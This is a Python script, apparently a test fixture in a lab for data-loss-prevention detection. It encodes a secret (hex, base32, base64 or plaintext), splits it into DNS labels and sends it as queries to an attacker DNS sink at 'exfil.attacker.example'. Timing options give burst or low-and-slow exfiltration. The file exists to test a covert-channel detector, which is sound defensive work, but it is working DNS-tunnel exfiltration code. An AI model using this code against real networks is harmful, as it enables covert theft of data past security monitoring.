"""DNS covert-channel test generator (Workstream C fixture).

Runs on the *victim* container to produce the DNS traffic patterns that the DLP
gateway's covert-channel detector must catch. Queries are built with the
standard library (no scapy needed, since they are plain UDP DNS packets);
terminal output reuses the shared `ui.display` presentation layer, the same one
the ICMP demo uses, so DNS and ICMP demos look consistent.

The secret is encoded, chunked into DNS labels, and sent as A/TXT queries for
`<chunk-index>.<encoded-chunk>.<base-domain>` straight at the attacker's DNS
sink. The queries traverse the gateway (default route), where the passive
sniffer inspects them.

Modes escalate in stealth (see docs taxonomy D1..D4):
  naive   D1  plaintext labels                (trips content/regex rules)
  hex     D2  base16 encoded
  base32  D2  base32 encoded (classic tunnel charset)
  base64  D2  urlsafe base64 encoded
Combine with --count / --delay for burst (D3) or low-and-slow (D4) timing.

Example:
    python attacks/dns_exfiltrate.py --secret "VISA 4111111111111111" \
        --mode base32 --server 172.21.0.10
"""

from __future__ import annotations

import argparse
import base64
import os
import random
import socket
import struct
import sys
import time

from ui.display import (
    print_hint,
    print_status,
    print_success,
    render_attack_banner,
    render_payload_telemetry,
)

DEFAULT_SERVER = os.environ.get("DNS_SINK_IP", "172.21.0.10")
DEFAULT_DOMAIN = "exfil.attacker.example"
MAX_LABEL = 63  # RFC 1035 label limit

# Per-mode banner copy: the objective shown to demo observers and the detector
# rule(s) each encoding is expected to trip (see dns_detector.py's taxonomy).
MODE_OBJECTIVE = {
    "naive": "Plaintext secret in DNS labels (human-readable QNAME)",
    "hex": "Base16-encoded secret smuggled in DNS query labels",
    "base32": "Base32-encoded secret smuggled in DNS query labels",
    "base64": "URL-safe base64 secret smuggled in DNS query labels",
}
MODE_EXPECTED = {
    "naive": "DNS_SENSITIVE_DATA_* / DNS_LONG_QNAME when the QNAME is sensitive or long",
    "hex": "DNS_HIGH_ENTROPY (encoded labels)",
    "base32": "DNS_HIGH_ENTROPY (encoded labels)",
    "base64": "DNS_HIGH_ENTROPY (encoded labels)",
}


def encode(secret: bytes, mode: str) -> str:
    """Encode the payload into a DNS-label-safe ASCII string."""
    if mode == "naive":
        # Keep it readable so content rules (regex/Luhn) can fire on the QNAME.
        return "".join(c if c.isalnum() else "-" for c in secret.decode("latin-1"))
    if mode == "hex":
        return secret.hex()
    if mode == "base32":
        return base64.b32encode(secret).decode("ascii").rstrip("=").lower()
    if mode == "base64":
        return base64.urlsafe_b64encode(secret).decode("ascii").rstrip("=")
    raise ValueError(f"unknown mode: {mode}")


def chunk(text: str, size: int) -> list[str]:
    size = max(1, min(size, MAX_LABEL))
    return [text[i : i + size] for i in range(0, len(text), size)]


def build_query(qname: str, qtype: int, txid: int) -> bytes:
    """Assemble a minimal DNS query packet (stdlib, no dnslib)."""
    header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)  # RD=1
    question = b""
    for label in qname.split("."):
        question += bytes([len(label)]) + label.encode("ascii")
    question += b"\x00" + struct.pack(">HH", qtype, 1)  # QTYPE, QCLASS=IN
    return header + question


def send_query(sock: socket.socket, server: str, qname: str, qtype: int) -> None:
    txid = random.randint(0, 0xFFFF)
    sock.sendto(build_query(qname, qtype, txid), (server, 53))
    try:
        sock.recvfrom(512)  # drain the reply if the sink answers; ignore content
    except socket.timeout:
        pass


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--secret", required=True, help="data to exfiltrate")
    parser.add_argument("--server", default=DEFAULT_SERVER, help="DNS sink IP")
    parser.add_argument("--domain", default=DEFAULT_DOMAIN, help="base domain")
    parser.add_argument(
        "--mode",
        default="base32",
        choices=["naive", "hex", "base32", "base64"],
    )
    parser.add_argument("--qtype", default="A", choices=["A", "TXT"])
    parser.add_argument("--chunk-size", type=int, default=30, help="chars per label")
    parser.add_argument("--count", type=int, default=1, help="repeat the run N times")
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="seconds between queries (jittered +-25%%); use for low-and-slow",
    )
    args = parser.parse_args()

    qtype = 16 if args.qtype == "TXT" else 1
    encoded = encode(args.secret.encode("utf-8"), args.mode)
    labels = chunk(encoded, args.chunk_size)
    total_queries = len(labels) * args.count

    expected = MODE_EXPECTED[args.mode]
    # Many distinct subdomains under one apex also trip the volume rule.
    if total_queries >= 8:
        expected += " + DNS_TUNNEL_VOLUME (high query volume)"

    render_attack_banner(
        target=f"{args.server}:53",
        scenario_mode=f"DNS Tunnel Exfiltration ({args.mode})",
        scenario_description=MODE_OBJECTIVE[args.mode],
        expected_alert_identifier=expected,
        channel_label="DNS Covert Channel",
    )

    render_payload_telemetry(
        args.secret.encode("utf-8"),
        panel_title="Secret to Exfiltrate",
    )

    print_status(
        f"Encoded with [bold]{args.mode}[/] -> {len(labels)} label(s), "
        f"sending {total_queries} [bold]{args.qtype}[/] query(ies) to "
        f"[yellow]{args.server}[/] ([dim]{args.domain}[/])"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    sent = 0
    for _ in range(args.count):
        for idx, label in enumerate(labels):
            qname = f"c{idx}.{label}.{args.domain}"
            if len(qname) > 253:
                qname = qname[:253]
            send_query(sock, args.server, qname, qtype)
            sent += 1
            print_status(f"[dim]q{sent:02d}[/] {args.qtype} -> {qname}")
            if args.delay:
                time.sleep(args.delay * random.uniform(0.75, 1.25))
    sock.close()

    print_success(f"{sent} quer{'y' if sent == 1 else 'ies'} sent to [yellow]{args.server}[/].")
    print_hint("Check covert-detector logs for the DNS tunnel alert.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
